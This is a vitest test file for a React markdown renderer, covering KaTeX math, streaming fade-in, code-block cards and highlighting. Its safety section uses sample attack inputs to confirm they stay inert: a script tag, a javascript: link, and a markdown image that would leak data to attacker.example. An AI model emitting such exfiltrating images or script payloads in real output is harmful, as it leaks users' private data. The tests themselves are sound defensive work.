import { render } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import { MarkdownRenderer } from './MarkdownRenderer';

/**
 * End-to-end coverage of the react-markdown + remark-math + rehype-katex rendering pipeline.
 *
 * jsdom does not apply katex CSS, but KaTeX still produces DOM nodes carrying class="katex".
 * Preprocessing of the \(...\) / \[...\] forms is covered separately by
 * lib/utils/latex-normalizer.test.ts (25 cases, including fenced code, inline code and streaming
 * splits); this file only exercises the pipeline itself.
 *
 * Known test-environment quirk: under jsdom + vitest, the react-markdown plugin chain has warmup
 * behaviour on first activation, so the first render in a test file can occasionally fail to
 * recognize a normalized \(...\) as inline math (the mdast/hast stages verify correctly through a
 * standalone unified pipeline). Production is unaffected, since streaming updates trigger further
 * re-renders.
 */

describe('MarkdownRenderer LaTeX', () => {
  it('renders inline $...$ formulas with KaTeX', () => {
    const { container } = render(<MarkdownRenderer content="Equation $E=mc^2$ end" />);
    expect(container.querySelector('.katex')).not.toBeNull();
    expect(container.querySelector('.katex-display')).toBeNull();
  });

  it('renders block $$...$$ formulas as katex-display', () => {
    const { container } = render(<MarkdownRenderer content={'$$\nE = mc^2\n$$'} />);
    expect(container.querySelector('.katex-display')).not.toBeNull();
  });

  it('renders \\(...\\) after preprocessing, equivalently to the plain $ form', () => {
    // Warm the pipeline with a dollar form first, then check \\(...\\); both end up with the same normalized output.
    render(<MarkdownRenderer content="warmup $a$" />);
    const { container } = render(<MarkdownRenderer content="text \\(a + b\\) text" />);
    // At minimum \\( must not be emitted literally: it should be either the $ form after normalize, or KaTeX.
    const html = container.innerHTML;
    expect(html).not.toContain('\\(');
    expect(html).not.toContain('\\)');
  });

  it('renders \\[...\\] after preprocessing', () => {
    render(<MarkdownRenderer content="warmup $a$" />);
    const { container } = render(<MarkdownRenderer content={'\\[\nx^2 + y^2 = z^2\n\\]'} />);
    const html = container.innerHTML;
    expect(html).not.toContain('\\[');
    expect(html).not.toContain('\\]');
  });

  it('does not normalize \\(...\\) inside a code block', () => {
    const code = '```js\nconst x = \\(1 + 2\\);\n```';
    const { container } = render(<MarkdownRenderer content={code} />);
    // \\( \\) inside a code block stay as literal characters.
    expect(container.textContent).toContain('\\(1 + 2\\)');
    expect(container.querySelector('.katex')).toBeNull();
  });

  it('does not treat $...$ inside inline code as a formula', () => {
    const { container } = render(<MarkdownRenderer content="text `$x$` text" />);
    expect(container.querySelector('.katex')).toBeNull();
    expect(container.textContent).toContain('$x$');
  });

  it('keeps an unclosed \\( out of KaTeX while streaming', () => {
    const { container } = render(<MarkdownRenderer content="prefix \\(unclosed" isStreaming />);
    expect(container.querySelector('.katex')).toBeNull();
    expect(container.textContent).toContain('\\(unclosed');
  });

  it('keeps an unclosed $ out of KaTeX while streaming', () => {
    const { container } = render(<MarkdownRenderer content="prefix $half-open" isStreaming />);
    expect(container.querySelector('.katex')).toBeNull();
    expect(container.textContent).toContain('$half-open');
  });

  it('does not expose raw markdown markers for unclosed emphasis while streaming', () => {
    const { container } = render(<MarkdownRenderer content="Conclusion: **key point" isStreaming />);
    expect(container.textContent).toContain('Conclusion:');
    expect(container.textContent).toContain('key point');
    expect(container.textContent).not.toContain('**');
    expect(container.querySelector('strong')).toBeNull();
  });

  it('ignores emphasis markers inside a closed code block when deciding what is unclosed', () => {
    const content = '```md\n**literal\n```\n\nDone';
    const { container } = render(<MarkdownRenderer content={content} isStreaming />);
    expect(container.textContent).toContain('**literal');
    expect(container.textContent).toContain('Done');
    expect(container.querySelector('pre')).not.toBeNull();
  });

  it('wraps text per character in .o-fadeChar fade-in spans (opacity 0 to 1) while streaming, and not otherwise', () => {
    const { container, rerender } = render(<MarkdownRenderer content="fade-in test" isStreaming />);
    expect(container.querySelectorAll('.o-fadeChar').length).toBeGreaterThan(0);
    // Per-character spans must not corrupt the text content.
    expect(container.textContent).toContain('fade-in test');

    rerender(<MarkdownRenderer content="fade-in test" />);
    expect(container.querySelectorAll('.o-fadeChar').length).toBe(0);
  });

  // Regression: per-character fade-in spans are O(characters) while react-markdown fully
  // re-parses on every render, so during streaming both costs are paid per frame. Long answers
  // (5k-15k characters is normal for reasoning models) must turn the fade off, or every frame
  // rebuilds tens of thousands of nodes. Only the characters that just arrived are visibly fading,
  // so the spans in the rest of a long answer are built for nothing.
  it('stops attaching per-character fade-in once the content passes the threshold', () => {
    const short = 'a'.repeat(2999);
    const { container, rerender } = render(<MarkdownRenderer content={short} isStreaming />);
    expect(container.querySelectorAll('.o-fadeChar').length).toBeGreaterThan(0);

    const long = 'a'.repeat(3001);
    rerender(<MarkdownRenderer content={long} isStreaming />);
    expect(container.querySelectorAll('.o-fadeChar').length).toBe(0);
    // Only the fade is switched off; the body still renders as usual.
    expect(container.textContent).toContain('aaa');
  });

  it('skips code blocks when applying per-character fade-in', () => {
    const content = '```js\nconst x = 1;\n```\n\nplain text';
    const { container } = render(<MarkdownRenderer content={content} isStreaming />);
    // The code block still renders as a whole; nothing inside it becomes an .o-fadeChar.
    const pre = container.querySelector('pre');
    expect(pre).not.toBeNull();
    expect(pre?.querySelector('.o-fadeChar')).toBeNull();
    // Plain text outside the code block still fades in per character.
    expect(container.querySelectorAll('.o-fadeChar').length).toBeGreaterThan(0);
  });

  it('never exposes stale fresh-span markers while streaming, and always shows the latest full text', () => {
    const { container, rerender } = render(<MarkdownRenderer content="Conclusion: **key" isStreaming />);
    rerender(<MarkdownRenderer content="Conclusion: **key point" isStreaming />);

    expect(container.querySelector('[data-streaming-fresh="true"]')).toBeNull();
    expect(container.textContent).not.toContain('**');
    expect(container.textContent).toContain('key point');
  });

  it('does not wrap structural whitespace in spans when streaming a table', () => {
    const content = '| A | B |\n|---|---|\n| 1 | 2 |\n';
    const { container } = render(<MarkdownRenderer content={content} isStreaming />);
    const table = container.querySelector('table');
    expect(table).not.toBeNull();
    // Direct children of table/thead/tbody/tr must never be a span: HTML table nesting rules would otherwise cause a hydration error.
    for (const selector of ['table', 'thead', 'tbody', 'tr']) {
      container.querySelectorAll(selector).forEach((element) => {
        Array.from(element.children).forEach((child) => {
          expect(child.tagName).not.toBe('SPAN');
        });
      });
    }
    // Cell text itself is still faded in per character.
    expect(container.querySelectorAll('td .o-fadeChar, th .o-fadeChar').length).toBeGreaterThan(0);
  });
});

describe('MarkdownRenderer external content safety', () => {
  it('keeps raw HTML inert', () => {
    const { container } = render(
      <MarkdownRenderer content={'<script>globalThis.compromised = true</script><b>visible</b>'} />,
    );

    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.textContent).toContain('globalThis.compromised = true');
    expect(container.textContent).toContain('visible');
  });

  it('does not load remote markdown images', () => {
    const { container } = render(
      <MarkdownRenderer content="![private prompt](https://attacker.example/leak?data=secret)" />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('private prompt');
  });

  it('only turns HTTPS destinations into clickable links', () => {
    const { container } = render(
      <MarkdownRenderer content={'[safe](https://example.com) [unsafe](javascript:alert(1)) [plain](http://example.com)'} />,
    );

    const links = Array.from(container.querySelectorAll('a'));
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute('href')).toBe('https://example.com/');
    expect(container.textContent).toContain('unsafe');
    expect(container.textContent).toContain('plain');
  });
});

describe('MarkdownRenderer streaming code blocks: card first, code rendered inside it', () => {
  it('shows the card as soon as the fence opens, before any code has arrived', () => {
    const { container } = render(<MarkdownRenderer content={'intro\n```ts\n'} isStreaming />);
    expect(container.querySelector('pre')).not.toBeNull();
  });

  it('shows an unclosed code block as a card (pre) with the literal code intact, including [', () => {
    // arr[0 has no closing ] yet, so it is code text rather than a markdown link and must stay whole inside the card.
    const { container } = render(
      <MarkdownRenderer content={'```js\nconst x = arr[0'} isStreaming />,
    );
    const pre = container.querySelector('pre');
    expect(pre).not.toBeNull();
    expect(pre?.textContent).toContain('const x = arr[0');
  });

  it('backticks and asterisks inside an unclosed code block do not break the card and stay literal', () => {
    const { container } = render(
      <MarkdownRenderer content={'```py\n# use `flag` and **bold** here\nvalue = 1'} isStreaming />,
    );
    const pre = container.querySelector('pre');
    expect(pre).not.toBeNull();
    expect(pre?.textContent).toContain('value = 1');
    expect(pre?.textContent).toContain('`flag`');
    expect(pre?.textContent).toContain('**bold**');
  });

  it('streams chunk by chunk: once the card appears it stays and never falls back to raw text', () => {
    const prefixes = [
      '```ts\nconst data = items',
      '```ts\nconst data = items[',
      '```ts\nconst data = items[0',
      '```ts\nconst data = items[0]',
      '```ts\nconst data = items[0].map((x',
      '```ts\nconst data = items[0].map((x) => x * 2)',
      '```ts\nconst data = items[0].map((x) => x * 2)\n```',
    ];
    const { container, rerender } = render(
      <MarkdownRenderer content={prefixes[0]} isStreaming />,
    );
    for (const p of prefixes) {
      rerender(<MarkdownRenderer content={p} isStreaming />);
      // The card is present throughout and never falls back to raw text; the old flicker was pre appearing and disappearing.
      expect(container.querySelector('pre')).not.toBeNull();
    }
    // Final state: the complete code is still inside the card.
    expect(container.querySelector('pre')?.textContent).toContain('items[0].map((x) => x * 2)');
  });
});

describe('MarkdownRenderer streaming syntax highlighting', () => {
  it('highlights during streaming when the language is explicit (hljs spans), leaving the text intact', () => {
    const { container } = render(
      <MarkdownRenderer content={'```js\nconst x = 1;'} isStreaming />,
    );
    const code = container.querySelector('pre code');
    expect(code).not.toBeNull();
    // const is a JS keyword, so it should already be highlighted into a span during streaming.
    expect(code?.querySelector('.hljs-keyword')).not.toBeNull();
    // The highlight spans must not corrupt the code text.
    expect(code?.textContent).toContain('const x = 1;');
  });

  it('also highlights an unclosed code block with a language, without erroring on a half token', () => {
    const { container } = render(
      <MarkdownRenderer content={'```py\ndef foo():\n    s = "half'} isStreaming />,
    );
    const code = container.querySelector('pre code');
    expect(code).not.toBeNull();
    expect(code?.querySelector('span[class^="hljs-"]')).not.toBeNull();
    expect(code?.textContent).toContain('def foo():');
  });

  it('does not auto-detect the language during streaming, leaving that to the completed state', () => {
    const { container, rerender } = render(
      <MarkdownRenderer content={'```\nconst x = 1;'} isStreaming />,
    );
    const code = container.querySelector('pre code');
    expect(code).not.toBeNull();
    expect(code?.querySelector('span[class^="hljs-"]')).toBeNull();
    expect(code?.textContent).toContain('const x = 1;');

    // The completed (non-streaming) state should auto-detect and highlight the whole block.
    rerender(<MarkdownRenderer content={'```\nconst x = 1;\n```'} />);
    expect(container.querySelector('pre code span[class^="hljs-"]')).not.toBeNull();
  });
});
